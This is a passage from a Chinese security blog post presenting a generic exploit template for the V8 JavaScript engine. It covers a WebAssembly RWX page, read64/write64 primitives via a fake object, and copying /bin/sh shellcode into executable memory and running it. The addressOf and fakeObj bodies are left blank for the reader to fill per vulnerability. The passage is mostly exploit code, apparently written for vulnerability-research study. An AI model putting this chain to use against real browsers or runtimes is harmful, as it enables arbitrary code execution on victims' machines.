class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(f64.<span class="property">buffer</span>);</span><br><span class="line"><span class="keyword">var</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(f64.<span class="property">buffer</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">v</span>) &#123;</span><br><span class="line">  f64[<span class="number">0</span>] = v;</span><br><span class="line">  <span class="keyword">return</span> u32;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">lo, hi</span>) &#123;</span><br><span class="line">  u32[<span class="number">0</span>] = lo;</span><br><span class="line">  u32[<span class="number">1</span>] = hi;</span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">  f64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">itof</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr_to_fake</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj_to_leak</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">1</span>] = <span class="title function_">itof</span>(addr - <span class="number">0x8n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">return</span> fake_object[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr, data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">1</span>] = <span class="title function_">itof</span>(addr - <span class="number">0x8n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = <span class="title function_">itof</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy_shellcode_to_rwx</span>(<span class="params">shellcode, rwx_addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line">  <span class="keyword">var</span> buf_backing_store_addr_lo = <span class="title function_">addressOf</span>(data_buf) + <span class="number">0x18n</span>;</span><br><span class="line">  <span class="keyword">var</span> buf_backing_store_addr_up = buf_backing_store_addr_lo + <span class="number">0x8n</span>;</span><br><span class="line">  <span class="keyword">var</span> lov = <span class="title function_">d2u</span>(<span class="title function_">read64</span>(buf_backing_store_addr_lo))[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">var</span> rwx_page_addr_lo = <span class="title function_">u2d</span>(lov, <span class="title function_">d2u</span>(rwx_addr)[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">var</span> hiv = <span class="title function_">d2u</span>(<span class="title function_">read64</span>(buf_backing_store_addr_up))[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">var</span> rwx_page_addr_hi = <span class="title function_">u2d</span>(<span class="title function_">d2u</span>(rwx_addr, hiv)[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">ftoi</span>(<span class="title function_">u2d</span>(lov, hiv));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] buf_backing_store_addr: 0x&quot;</span>+<span class="title function_">hex</span>(buf_backing_store_addr));</span><br><span class="line"></span><br><span class="line">  <span class="title function_">write64</span>(buf_backing_store_addr_lo, <span class="title function_">ftoi</span>(rwx_page_addr_lo));</span><br><span class="line">  <span class="title function_">write64</span>(buf_backing_store_addr_up, <span class="title function_">ftoi</span>(rwx_page_addr_hi));</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; ++i)</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(i * <span class="number">8</span>, <span class="title function_">itof</span>(shellcode[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span> : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> array_map = ?;</span><br><span class="line"><span class="keyword">var</span> obj_map = ?;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">  array_map,</span><br><span class="line">  <span class="title function_">itof</span>(<span class="number">0x4141414141414141n</span>)</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_array_addr = <span class="title function_">addressOf</span>(fake_array);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] leak fake_array addr: 0x&quot;</span> + <span class="title function_">hex</span>(fake_array_addr));</span><br><span class="line">fake_object_addr = fake_array_addr - <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = <span class="title function_">fakeObj</span>(fake_object_addr);</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = <span class="title function_">addressOf</span>(wasmInstance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] leak wasm_instance addr: 0x&quot;</span> + <span class="title function_">hex</span>(wasm_instance_addr));</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title function_">read64</span>(wasm_instance_addr + <span class="number">0x68n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="title function_">hex</span>(<span class="title function_">ftoi</span>(rwx_page_addr)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">  <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="title function_">copy_shellcode_to_rwx</span>(shellcode, rwx_page_addr);</span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<p>其中打问号的地方，需要根据具体情况来编写，然后就是有些偏移需要根据v8版本情况进行修改，但是主体结构基本雷同。</p>
<p>之后的文章中，打算把我最近研究复现的几个漏洞，套进这个模板中，来进行讲解。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://c0ke.top">C0KE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://c0ke.top/2025/07/30/V8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/">http://c0ke.top/2025/07/30/V8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://c0ke.top" target="_blank">Daily Study</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/07/30/%E5%BC%82%E6%AD%A5/" title="异步"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">异步</div></div></a></div><div class="next-post pull-right"><a href="/2025/07/30/CVE-2020-6537%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" title="CVE-2020-6537分析报告"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CVE-2020-6537分析报告</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C0KE</div><div class="author-info__description">C0KE's Study Diary</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">404</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/C0KE"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/C0KE" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/weixin_62675330?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2269279877@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">人人都有选择如何活着的权力</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#V8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">V8-通用利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WASM%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">WASM的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">高版本的变化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%82%A8%E5%AD%98%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text">数据储存方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSArray-a"><span class="toc-number">1.3.1.</span> <span class="toc-text">JSArray:a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JS-OBJECT-TYPE-b"><span class="toc-number">1.3.2.</span> <span class="toc-text">JS_OBJECT_TYPE:b</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSArray-c"><span class="toc-number">1.3.3.</span> <span class="toc-text">JSArray:c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSArray%EF%BC%9Ad"><span class="toc-number">1.3.4.</span> <span class="toc-text">JSArray：d</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E8%AF%86%E5%88%AB"><span class="toc-number">1.3.5.</span> <span class="toc-text">类型识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%8F%98%E9%87%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="toc-number">1.4.</span> <span class="toc-text">任意变量地址读</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#addressOf"><span class="toc-number">1.4.1.</span> <span class="toc-text">addressOf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fakeObject"><span class="toc-number">1.4.2.</span> <span class="toc-text">fakeObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="toc-number">1.4.3.</span> <span class="toc-text">任意地址读</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">1.5.</span> <span class="toc-text">任意地址写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5shellcode"><span class="toc-number">1.6.</span> <span class="toc-text">写入shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80%E6%89%8B%E8%AE%B0"><span class="toc-number">1.7.</span> <span class="toc-text">泄露地址手记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E7%94%A8%E7%9A%84shellcode"><span class="toc-number">1.8.</span> <span class="toc-text">可用的shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.9.</span> <span class="toc-text">模板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.9.1.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/Tenda-FH1201%E5%A4%9A%E5%A4%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0/" title="Tenda-FH1201多处命令注入漏洞分析和复现"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tenda-FH1201多处命令注入漏洞分析和复现"/></a><div class="content"><a class="title" href="/2025/07/30/Tenda-FH1201%E5%A4%9A%E5%A4%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0/" title="Tenda-FH1201多处命令注入漏洞分析和复现">Tenda-FH1201多处命令注入漏洞分析和复现</a><time datetime="2025-07-30T03:04:06.916Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/GL-iNet%20%E8%B7%AF%E7%94%B1%E5%99%A8%20CVE-2024-39226%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="GL-iNet 路由器 CVE-2024-39226 漏洞分析"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GL-iNet 路由器 CVE-2024-39226 漏洞分析"/></a><div class="content"><a class="title" href="/2025/07/30/GL-iNet%20%E8%B7%AF%E7%94%B1%E5%99%A8%20CVE-2024-39226%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="GL-iNet 路由器 CVE-2024-39226 漏洞分析">GL-iNet 路由器 CVE-2024-39226 漏洞分析</a><time datetime="2025-07-30T03:04:06.914Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E5%90%AF%E5%8A%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83/" title="启动路由器环境"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="启动路由器环境"/></a><div class="content"><a class="title" href="/2025/07/30/%E5%90%AF%E5%8A%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83/" title="启动路由器环境">启动路由器环境</a><time datetime="2025-07-30T03:04:06.907Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E4%BF%AE%E5%A4%8D%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83+%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" title="修复路由器程序运行环境+远程调试"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="修复路由器程序运行环境+远程调试"/></a><div class="content"><a class="title" href="/2025/07/30/%E4%BF%AE%E5%A4%8D%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83+%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" title="修复路由器程序运行环境+远程调试">修复路由器程序运行环境+远程调试</a><time datetime="2025-07-30T03:04:06.906Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/ikuai-3.7.10%E7%89%88%E6%9C%AC%E4%BB%A5%E4%B8%8B%E6%9C%89%E6%8E%88%E6%9D%83%E7%9A%84cmd%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/" title="ikuai-3.7.10版本以下有授权的cmd执行复现"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ikuai-3.7.10版本以下有授权的cmd执行复现"/></a><div class="content"><a class="title" href="/2025/07/30/ikuai-3.7.10%E7%89%88%E6%9C%AC%E4%BB%A5%E4%B8%8B%E6%9C%89%E6%8E%88%E6%9D%83%E7%9A%84cmd%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/" title="ikuai-3.7.10版本以下有授权的cmd执行复现">ikuai-3.7.10版本以下有授权的cmd执行复现</a><time datetime="2025-07-30T03:04:06.904Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By C0KE</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="C0KE,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>